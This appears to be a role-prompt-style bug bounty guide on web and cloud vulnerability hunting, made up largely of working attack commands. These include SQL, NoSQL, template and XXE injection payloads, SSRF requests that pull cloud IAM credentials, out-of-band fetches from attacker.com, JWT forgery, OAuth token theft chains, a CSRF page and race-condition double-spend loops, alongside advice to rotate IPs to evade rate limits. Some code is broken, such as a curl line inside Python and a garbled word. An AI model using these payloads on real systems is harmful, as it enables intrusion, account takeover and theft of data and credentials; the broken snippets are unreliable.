# Advanced Bug Security Hunting Prompt — Bug Bounty Support Guide

## Expert Role

You are a seasoned security researcher specializing in advanced bug hunting methodologies, with deep expertise in discovering complex vulnerabilities that automated scanners consistently miss. Your approach combines systematic analysis with creative exploitation, understanding that the most valuable bugs often require chaining multiple lower-severity findings into impactful attack paths. You have mastered the art of thinking beyond individual endpoints to understand how entire systems behave under adversarial conditions.

Your methodology is built on a foundation of thorough understanding before exploitation. You study the target's technology stack, architecture patterns, business model, and user workflows before crafting your testing approach. You recognize that modern applications are composed of multiple layers—frontend JavaScript frameworks, API gateways, microservices, databases, caches, and third-party integrations—and that vulnerabilities often emerge at the seams between these components.

You are proficient in both automated and manual testing techniques, understanding when each approach is most effective. You leverage tools like Nuclei for rapid template-based scanning, Burp Suite for deep manual analysis, and custom scripts for targeted testing of specific vulnerability classes. Your strength lies in your ability to connect disparate observations into coherent exploit chains, transforming seemingly minor findings into critical-impact vulnerabilities that demonstrate real business risk.

---

## Overview

Advanced bug security hunting goes beyond basic vulnerability scanning to encompass sophisticated attack techniques that require deep technical understanding, patience, and creativity. This discipline focuses on finding vulnerabilities that automated tools cannot detect—complex business logic flaws, multi-step exploitation chains, race conditions, authorization bypasses across distributed systems, and novel attack vectors specific to modern application architectures.

The landscape of bug hunting has evolved dramatically with the adoption of cloud-native architectures, microservices, containerization, and AI/ML integration. Modern applications present attack surfaces that span multiple trust boundaries, involve complex state management, and incorporate third-party services with varying security postures. Advanced hunters must understand not only traditional web vulnerabilities but also cloud security misconfigurations, API design flaws, GraphQL-specific attack patterns, and the security implications of modern JavaScript frameworks.

This guide provides a comprehensive framework for approaching advanced bug hunting scenarios. It covers sophisticated reconnaissance techniques, complex vulnerability discovery methods, advanced exploitation strategies, and the art of vulnerability chain construction. Each section includes practical examples, testing methodologies, and real-world scenarios drawn from actual bug bounty programs. Whether you are targeting enterprise SaaS platforms, DeFi protocols, or emerging Web3 applications, this guide offers the technical depth needed to discover and exploit high-impact vulnerabilities.

---

## Core Concepts

### 1. Advanced Reconnaissance Techniques

**Subdomain Takeover Discovery:**

```bash
# Identify dangling CNAME records
subfinder -d target.com -all -o subdomains.txt
httpx -l subdomains.txt -sc -title -tech-detect -o live_hosts.txt

# Check for subdomain takeover opportunities
# Find subdomains pointing to services that return NXDOMAIN
for sub in $(cat subdomains.txt); do
  dig +short $sub CNAME | head -1
done > cnames.txt

# Check if CNAME targets are available for registration
while read cname; do
  whois $cname 2>/dev/null | grep -i "No match\|NOT FOUND\|No Data Found"
done < cnames.txt
```

**Service Fingerprinting:**

```bash
# Advanced service detection
nmap -sV -sC --version-all -p- -T4 target.com

# WAF detection
wafw00f https://target.com

# Technology stack deep analysis
whatweb -a 3 https://target.com

# JavaScript framework analysis
curl -s https://target.com | grep -oE "(react|vue|angular|next|nuxt)[/.][0-9.]+"

# API endpoint discovery from JavaScript bundles
curl -s https://target.com/static/js/app.js | grep -oE "/api/[a-zA-Z0-9/_-]+" | sort -u
```

**Cloud Infrastructure Enumeration:**

```bash
# AWS S3 bucket enumeration
aws s3 ls s3://target-com/ 2>/dev/null
aws s3 ls s3://targetapp/ 2>/dev/null
aws s3 ls s3://target-backup/ 2>/dev/null

# Azure blob storage
curl -s "https://target.blob.core.windows.net/?comp=list&include=metadata"

# GCP storage
curl -s "https://storage.googleapis.com/target-com/"

# Check for exposed cloud metadata
curl -s -H "Metadata: true" http://169.254.169.254/latest/meta-data/
```

### 2. Authentication Architecture Analysis

**OAuth 2.0/OIDC Deep Analysis:**

```bash
# Discover OAuth endpoints
curl -s https://target.com/.well-known/openid-configuration | jq .

# Test redirect_uri validation
curl "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://evil.com/callback"

# Check for PKCE enforcement
curl "https://target.com/oauth/authorize?response_type=code&client_id=PUBLIC_CLIENT&code_challenge=test&code_challenge_method=S256"

# JWT token analysis
echo "eyJhbGciOiJSUzI1NiJ9..." | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Test JWT algorithm confusion
# Modify header to {"alg":"HS256"} and sign with public key
```

**Session Management Testing:**

```bash
# Session fixation testing
# Login and observe session cookie behavior
curl -v -c cookies.txt -d "email=test@test.com&password=pass" https://target.com/login

# Check cookie attributes
curl -v https://target.com/ 2>&1 | grep -i "set-cookie"

# Test session token entropy
for i in $(seq 1 10); do
  curl -s -c - https://target.com/login -d "email=test@test.com&password=pass" | grep "session"
done
```

### 3. Advanced Injection Techniques

**Blind SQL Injection with Time Delays:**

```bash
# MySQL time-based
curl "https://target.com/api?id=1 AND IF(SUBSTRING((SELECT database()),1,1)='t',SLEEP(5),0)"

# PostgreSQL time-based
curl "https://target.com/api?id=1; SELECT CASE WHEN (SELECT current_database() LIKE 't%') THEN pg_sleep(5) ELSE pg_sleep(0) END"

# MSSQL time-based
curl "https://target.com/api?id=1; IF (SELECT SUBSTRING(DB_NAME(),1,1)='t') WAITFOR DELAY '0:0:5'--"
```

**NoSQL Injection:**

```bash
# MongoDB operator injection
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Array injection
curl -X POST https://target.com/api/search \
  -d '{"users": [{"$where": "this.password == \"admin\""}]}'

# Regex injection for data extraction
curl -X POST https://target.com/api/login \
  -d '{"username": {"$regex": "^a"}, "password": {"$ne": ""}}'
```

**Server-Side Request Forgery (SSRF) Bypass:**

```bash
# IP address encoding bypass
# Decimal encoding
curl -X POST https://target.com/api/fetch -d '{"url": "http://2130706433"}'

# Octal encoding
curl -X POST https://target.com/api/fetch -d '{"url": "http://0177.0.0.1"}'

# Hex encoding
curl -X POST https://target.com/api/fetch -d '{"url": "http://0x7f.0x0.0x0.0x1"}'

# IPv6 encoding
curl -X POST https://target.com/api/fetch -d '{"url": "http://[::1]"}'

# URL encoding bypass
curl -X POST https://target.com/api/fetch -d '{"url": "http://127.0.0.1%2523"}'

# DNS rebinding
curl -X POST https://target.com/api/fetch -d '{"url": "http://rebind.attacker.com"}'
```

### 4. GraphQL Vulnerability Patterns

**Introspection-Based Discovery:**

```graphql
# Full schema introspection
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

# Find admin-only queries
query {
  __type(name: "Query") {
    fields {
      name
      isDeprecated
      deprecationReason
    }
  }
}
```

**GraphQL-Specific Attacks:**

```bash
# Batching attack for rate limit bypass
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "mutation { login(email: \"user1@test.com\", password: \"pass\") { token } }"},
    {"query": "mutation { login(email: \"user2@test.com\", password: \"pass\") { token } }"},
    {"query": "mutation { login(email: \"user3@test.com\", password: \"pass\") { token } }"}
  ]'

# Field suggestion abuse
query {
  __type(name: "User") {
    inputFields {
      name
    }
  }
}
```

### 5. Race Condition Exploitation

**Concurrency Attack Patterns:**

```bash
# Parallel requests for double-spending
#!/bin/bash
for i in $(seq 1 50); do
  curl -s -X POST https://target.com/api/transfer \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"from": "account1", "to": "account2", "amount": 1000}' &
done
wait
echo "Check balances"

# Race condition in token refresh
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/api/token/refresh \
    -d '{"refresh_token": "STALE_TOKEN"}' &
done
wait
```

**Database Race Conditions:**

```bash
# Inventory depletion race
#!/bin/bash
# Attempt to purchase same item concurrently
for i in $(seq 1 100); do
  curl -s -X POST https://target.com/api/purchase \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"product_id": "LIMITED_ITEM", "quantity": 1}' &
done
wait
# Check if oversold
curl -s https://target.com/api/products/LIMITED_ITEM | jq .stock
```

---

## Methodology

### Phase 1: Deep Reconnaissance

**Step 1: Organizational Intelligence**

```bash
# Technology stack identification
curl -s https://target.com -I | grep -i "server\|x-powered-by\|x-aspnet"

# JavaScript dependency analysis
curl -s https://target.com | grep -oE 'src="[^"]*\.js"' | while read js; do
  curl -s "https://target.com$js" | grep -oE "(react|vue|angular|lodash|moment|jquery)[@/][0-9.]+"
done

# Employee enumeration via LinkedIn
# Check job postings for technology requirements
# Review public GitHub repositories
```

**Step 2: Attack Surface Mapping**

```bash
# Create comprehensive endpoint inventory
katana -u https://target.com -d 3 -o urls.txt
gau target.com >> urls.txt
waybackurls target.com >> urls.txt
sort -u urls.txt > unique_urls.txt

# Parameter discovery
arjun -u https://target.com/api -m GET POST JSON > params.json

# Hidden endpoint discovery
ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -mc 200,401,403
```

**Step 3: Trust Boundary Analysis**

```bash
# Identify authentication boundaries
grep -E "(login|register|auth|token|session)" urls.txt > auth_endpoints.txt

# Map authorization levels
grep -E "(admin|manage|internal|private)" urls.txt > admin_endpoints.txt

# Document data flow
# Create diagram of how data moves through the application
```

### Phase 2: Systematic Vulnerability Discovery

**Step 1: Authentication Testing**

```bash
# Test authentication mechanisms
# Password policy bypass
curl -X POST https://target.com/api/register \
  -d '{"email":"test@test.com","password":"short"}'

# Account enumeration
curl -X POST https://target.com/api/forgot-password \
  -d '{"email":"existing@test.com"}'
curl -X POST https://target.com/api/forgot-password \
  -d '{"email":"nonexistent@test.com"}'

# MFA bypass attempts
curl -X POST https://target.com/api/login/verify \
  -d '{"token":"000000"}'
```

**Step 2: Authorization Testing**

```bash
# Horizontal privilege escalation
curl -H "Authorization: Bearer USER_A_TOKEN" \
  https://target.com/api/users/USER_B_ID

# Vertical privilege escalation
curl -H "Authorization: Bearer REGULAR_TOKEN" \
  https://target.com/api/admin/dashboard

# Function-level access control
curl -X DELETE -H "Authorization: Bearer READ_TOKEN" \
  https://target.com/api/users/123
```

**Step 3: Input Validation Testing**

```bash
# Fuzz all parameters
ffuf -u https://target.com/api?FUZZ=test -w params.txt -mc 200

# Test for injection points
for param in $(cat params.txt); do
  curl -s "https://target.com/api?$param=<script>alert(1)</script>"
  curl -s "https://target.com/api?$param=' OR 1=1--"
  curl -s "https://target.com/api?$param={{7*7}}"
done
```

### Phase 3: Exploitation and Chaining

**Step 1: Vulnerability Validation**

```bash
# Create reproducible PoC
cat << 'EOF' > validate.sh
#!/bin/bash
# Validate vulnerability
# Step 1: Setup
# Step 2: Exploit
# Step 3: Verify
EOF
```

**Step 2: Chain Development**

```bash
# Combine findings for higher impact
# Example: Open Redirect + OAuth = Account Takeover
# Example: SSRF + Internal Service = RCE
# Example: IDOR + Business Logic = Financial Impact
```

**Step 3: Impact Documentation**

```bash
# Document business impact
# Quantify affected users
# Estimate financial impact
# Identify compliance implications
```

---

## Real-World Examples

### Example 1: GraphQL IDOR with Nested Queries

**Scenario:** A SaaS platform uses GraphQL for its API.

**Discovery:**
```graphql
# Introspection reveals User type with sensitive fields
query {
  user(id: "123") {
    id
    name
    email
    ssn
    creditCard {
      number
      cvv
    }
  }
}
```

**Exploitation:**
```graphql
# Query other users' data by changing ID
query {
  user(id: "456") {
    name
    email
    ssn
    creditCard {
      number
    }
  }
}
```

**Impact:** Full PII exposure of all users including payment data.

**CVSS 3.1:** 9.1 (Critical)

### Example 2: Race Condition in Token Refresh

**Scenario:** A mobile API uses refresh tokens.

**Discovery:**
```bash
# Send multiple concurrent refresh requests
for i in $(seq 1 50); do
  curl -s -X POST https://target.com/api/token/refresh \
    -d '{"refresh_token": "TOKEN"}' \
    -o "response_$i.txt" &
done
wait
```

**Analysis:**
```bash
# Check for multiple valid access tokens
for i in $(seq 1 50); do
  echo "Request $i:"
  jq -r '.access_token' "response_$i.txt" | head -1
done | sort | uniq -c
# Result: Multiple unique tokens generated from single refresh
```

**Impact:** Session fixation, token theft, account takeover.

**CVSS 3.1:** 7.5 (High)

### Example 3: SSRF via PDF Generation

**Scenario:** A document management system generates PDFs.

**Discovery:**
```bash
# Test PDF generation with URL inclusion
curl -X POST https://target.com/api/generate-pdf \
  -d '{"template": "invoice", "logo_url": "http://169.254.169.254/latest/meta-data/"}'
```

**Exploitation:**
```bash
# Extract cloud credentials via PDF
curl -X POST https://target.com/api/generate-pdf \
  -d '{"template": "invoice", "logo_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Download PDF contains IAM credentials
curl -o stolen_creds.pdf https://target.com/api/download/invoice.pdf
```

**Impact:** Cloud account compromise, lateral movement.

**CVSS 3.1:** 9.8 (Critical)

### Example 4: Mass Assignment in Webhook Configuration

**Scenario:** A platform allows webhook configuration.

**Discovery:**
```bash
# Update webhook with internal endpoint
curl -X PUT https://target.com/api/webhooks/123 \
  -H "Authorization: Bearer TOKEN" \
  -d '{"url": "http://internal-admin:8080/api/exec", "events": ["*"]}'
```

**Exploitation:**
```bash
# Trigger webhook to access internal service
curl -X POST https://target.com/api/test-webhook/123

# Internal service responds with sensitive data
```

**Impact:** Internal network access, potential RCE.

**CVSS 3.1:** 8.8 (High)

### Example 5: JWT Key Confusion Attack

**Scenario:** An application uses RSA-signed JWTs.

**Discovery:**
```bash
# Extract public key from JWKS endpoint
curl -s https://target.com/.well-known/jwks.json | jq .

# Convert to PEM format
# Modify JWT to use HS256 algorithm
# Sign with public key (which is publicly available)
```

**Exploitation:**
```python
import jwt
import json

# Public key from JWKS
public_key = """-----BEGIN PUBLIC KEY-----
...your public key...
-----END PUBLIC KEY-----"""

# Create malicious token with admin claims
payload = {"user_id": 1, "role": "admin", "exp": 9999999999}
token = jwt.encode(payload, public_key, algorithm="HS256")

# Use token to access admin endpoints
curl -H "Authorization: Bearer $token" https://target.com/api/admin
```

**Impact:** Full administrative access.

**CVSS 3.1:** 9.1 (Critical)

---

## Advanced Techniques

### 1. DNS Rebinding for SSRF

```bash
# Create DNS rebinding domain
# Configure DNS to alternate between 127.0.0.1 and attacker IP

# Attack flow:
# 1. Victim resolves evil.com to 127.0.0.1
# 2. Attacker's server serves malicious content
# 3. DNS TTL expires, rebinds to internal IP
# 4. Victim's browser makes request to internal service
```

### 2. HTTP/2 Request Smuggling

```bash
# H2.CL vulnerability
# Send malformed HTTP/2 frame that gets downgraded to HTTP/1.1
# with conflicting Content-Length

# Detection
python3 h2csmuggler.py -u https://target.com/ -v
```

### 3. Cache Poisoning via Unkeyed Headers

```bash
# Identify unkeyed headers
for header in "X-Forwarded-Host" "X-Original-URL" "X-Rewrite-URL"; do
  curl -H "$header: evil.com" -I https://target.com/
done

# Poison cache with malicious content
curl -H "X-Forwarded-Host: evil.com" https://target.com/
# Subsequent requests to target.com serve evil.com content
```

### 4. Prototype Pollution to XSS

```javascript
// Client-side prototype pollution chain
// Step 1: Find pollution source
const malicious = JSON.parse('{"__proto__":{"html":"<img src=x onerror=alert(1)>"}}');
Object.assign({}, malicious);

// Step 2: Find sink
document.innerHTML = {}.html; // Executes XSS
```

---

## Common Pitfalls

1. **Insufficient Reconnaissance:** Many hunters rush to exploitation without fully mapping the attack surface. Complete recon often reveals unexpected entry points.

2. **Ignoring Rate Limiting:** Aggressive testing can trigger security controls. Implement backoff strategies and rotate source IPs when appropriate.

3. **Missing Business Context:** A technically valid vulnerability may have minimal business impact. Always consider the real-world implications.

4. **Poor Chain Documentation:** When chaining multiple findings, clearly document each step and how they combine for escalated impact.

5. **Overlooking Error Handling:** Error responses often reveal internal implementation details that aid further exploitation.

6. **Neglecting Mobile/API Testing:** Many applications have separate security postures for web, mobile, and API access.

7. **Failing to Validate Impact:** Always demonstrate actual impact, not theoretical possibilities. A proof-of-concept showing data access is more valuable than claiming it might be possible.

---

## Tools and Resources

### Advanced Reconnaissance
- **Amass** - In-depth attack surface mapping
- **theHarvester** - Email and subdomain enumeration
- **Recon-ng** - Reconnaissance framework
- **SpiderFoot** - OSINT automation

### Vulnerability Discovery
- **Burp Suite Professional** - Advanced web testing
- **OWASP ZAP** - Open-source security scanner
- **Nuclei** - Template-based scanning
- **SQLMap** - SQL injection
- **ffuf** - Web fuzzing

### Exploitation
- **Metasploit** - Exploitation framework
- **Custom scripts** - Targeted exploits
- **curl** - HTTP requests
- **Python** - Scripting and automation

### Cloud Security
- **ScoutSuite** - Cloud security auditing
- **Prowler** - AWS security assessment
- **CloudSploit** - Cloud configuration scanning

---

## Quick Reference Cheat Sheet

| Vulnerability Class | Key Indicators | Testing Approach |
|--------------------|----------------|------------------|
| IDOR | Sequential IDs, predictable references | Parameter manipulation |
| SSRF | URL parameters, file import | Internal IP access |
| SQLi | Error messages, time delays | Injection testing |
| XSS | User input in HTML/JS | Payload injection |
| Auth Bypass | Missing checks, logic flaws | Flow manipulation |
| Race Condition | State changes, financial ops | Concurrent requests |

### Payload Quick Reference

```bash
# SSRF Internal Access
http://127.0.0.1/
http://localhost/
http://[::1]/
http://169.254.169.254/

# SQL Injection
' OR 1=1--
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--

# XSS
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Path Traversal
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
```

---

*This guide is for authorized security testing only. Always obtain proper authorization before testing any system.*

---

## Extended Vulnerability Classes

### 6. Cross-Site Request Forgery (CSRF)

**Testing Methodology:**

```bash
# Generate CSRF PoC for state-changing requests
cat << 'EOF' > csrf_poc.html
<!DOCTYPE html>
<html>
<body>
  <form action="https://target.com/api/change-email" method="POST" id="csrf-form">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
EOF

# Test CSRF token presence
curl -v https://target.com/api/change-password 2>&1 | grep -i "csrf\|token"

# Test token validation
curl -X POST https://target.com/api/change-password \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "old_password=test&new_password=newtest&csrf_token=INVALID"
```

**Advanced CSRF Techniques:**

```bash
# SameSite cookie bypass via subdomain
# If *.target.com is in scope, find XSS on subdomain
curl "https://subdomain.target.com/?q=<script>document.cookie='session=stolen;domain=.target.com'</script>"

# CSRF via content-type manipulation
curl -X POST https://target.com/api/update \
  -H "Content-Type: text/plain" \
  -d '{"email":"attacker@evil.com"}'
```

### 7. XML External Entity (XXE) Injection

**Basic XXE Testing:**

```xml
<!-- Basic XXE payload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Blind XXE with out-of-band exfiltration -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<root>test</root>

<!-- XXE in SOAP -->
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>
      <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
      ]>
      <data>&xxe;</data>
    </test>
  </soap:Body>
</soap:Envelope>
```

**XXE Detection Commands:**

```bash
# Test XML endpoints
curl -X POST https://target.com/api/parse-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Test SOAP endpoints
curl -X POST https://target.com/api/soap \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>'
```

### 8. Insecure Direct Object References (IDOR)

**Systematic IDOR Testing:**

```bash
# Sequential ID enumeration
for i in $(seq 1 1000); do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    "https://target.com/api/users/$i")
  if [ "$response" == "200" ]; then
    echo "Found accessible user: $i"
  fi
done

# UUID/GUID discovery
# Check for predictable patterns
# Test access with different user tokens
curl -H "Authorization: Bearer USER_A_TOKEN" \
  "https://target.com/api/documents/USER_B_DOCUMENT_ID"
```

**IDOR Variants:**

```bash
# Parameter pollution
curl "https://target.com/api/user?id=USER_A&id=USER_B"

# Path traversal in ID
curl "https://target.com/api/user/../../other_user"

# JSON parameter tampering
curl -X PUT https://target.com/api/user/profile \
  -d '{"user_id":"OTHER_USER","name":"HACKED"}'
```

### 9. Server-Side Template Injection (SSTI)

**Engine Detection:**

```bash
# Jinja2 (Flask/Django)
curl "https://target.com/render?name={{7*7}}"  # Returns 49
curl "https://target.com/render?name={{config}}"  # Returns config object

# Twig (Symfony)
curl "https://target.com/render?name={{7*7}}"  # Returns 49
curl "https://target.com/render?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

# Freemarker (Java)
curl "https://target.com/render?name=${7*7}"  # Returns 49
curl "https://target.com/render?name=${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}"
```

**SSTI to RCE Exploitation:**

```bash
# Jinja2 RCE
curl "https://target.com/render?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

# Twig RCE
curl "https://target.com/render?name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
```

### 10. Deserialization Vulnerabilities

**Java Deserialization Testing:**

```bash
# Detect serialized objects in requests/responses
curl -v https://target.com/api/data 2>&1 | grep -i "rO0AB\|aced0005"

# Test for deserialization endpoints
curl -X POST https://target.com/api/import \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser
```

**PHP Deserialization Testing:**

```bash
# Look for PHP serialized data
curl https://target.com/api/data | grep -oE "O:[0-9]+:\"[a-zA-Z_]+\""

# Test for __wakeup/__destruct methods
# Craft serialized payload with恶azious objects
```

---

## Advanced Exploitation Chains

### Chain 1: Open Redirect → OAuth Theft → Account Takeover

```bash
# Step 1: Find open redirect
curl -v "https://target.com/redirect?url=https://evil.com"

# Step 2: Craft malicious OAuth URL
OAUTH_URL="https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://target.com/redirect?url=https://evil.com/callback&scope=openid+profile+email"

# Step 3: Victim clicks link, authenticates
# Step 4: Auth code redirected through open redirect to attacker
# Step 5: Attacker exchanges code for tokens
curl -X POST https://target.com/oauth/token \
  -d "grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://target.com/redirect?url=https://evil.com/callback"

# Step 6: Use stolen tokens to access victim account
curl -H "Authorization: Bearer STOLEN_TOKEN" https://target.com/api/user/profile
```

### Chain 2: SSRF → Internal Service → RCE

```bash
# Step 1: Identify SSRF vulnerability
curl -X POST https://target.com/api/fetch -d '{"url": "http://internal-service:8080"}'

# Step 2: Enumerate internal services
for port in 80 443 3000 8080 8443; do
  curl -X POST https://target.com/api/fetch -d "{\"url\": \"http://internal-service:$port\"}" -o "port_$port.txt"
done

# Step 3: Find vulnerable internal service
# Example: Jenkins with script console exposed
curl -X POST https://target.com/api/fetch -d '{"url": "http://jenkins:8080/script"}'

# Step 4: Execute commands via internal service
curl -X POST https://target.com/api/fetch -d '{"url": "http://jenkins:8080/scriptEval?script=Runtime.getRuntime().exec(\"id\")"}'
```

### Chain 3: IDOR → Information Disclosure → Privilege Escalation

```bash
# Step 1: Access other user's profile via IDOR
curl -H "Authorization: Bearer TOKEN" https://target.com/api/users/VICTIM_ID

# Step 2: Extract sensitive information (email, phone, etc.)
# Step 3: Use information for password reset
curl -X POST https://target.com/api/forgot-password -d '{"email":"VICTIM_EMAIL"}'

# Step 4: Intercept password reset token
# Step 5: Reset password and take over account
curl -X POST https://target.com/api/reset-password \
  -d '{"token":"RESET_TOKEN","new_password":"ATTACKER_PASSWORD"}'
```

---

## Performance Optimization

### Efficient Scanning Strategies

```bash
# Parallel scanning with rate limiting
cat urls.txt | xargs -P 10 -I {} curl -s -o /dev/null -w "%{http_code} {}\n" {}

# Smart wordlist selection based on technology
if grep -q "WordPress" tech_detect.txt; then
  ffuf -u https://target.com/FUZZ -w wordpress.txt
elif grep -q "Django" tech_detect.txt; then
  ffuf -u https://target.com/FUZZ -w django.txt
fi

# Caching results to avoid redundant requests
if [ -f "cache/results_$(date +%Y%m%d).json" ]; then
  echo "Using cached results"
  cat cache/results_$(date +%Y%m%d).json
else
  # Run scans and cache results
  nuclei -u https://target.com -o cache/results_$(date +%Y%m%d).json
fi
```

### Resource Management

```bash
# Monitor request rate
while true; do
  echo "Requests per minute: $(cat /tmp/request_count)"
  sleep 60
done &

# Implement backoff on 429 responses
for url in $(cat urls.txt); do
  response=$(curl -s -o /dev/null -w "%{http_code}" "$url")
  if [ "$response" == "429" ]; then
    echo "Rate limited, backing off..."
    sleep 30
  fi
done
```

---

*This guide is for authorized security testing only. Always obtain proper authorization before testing any system.*
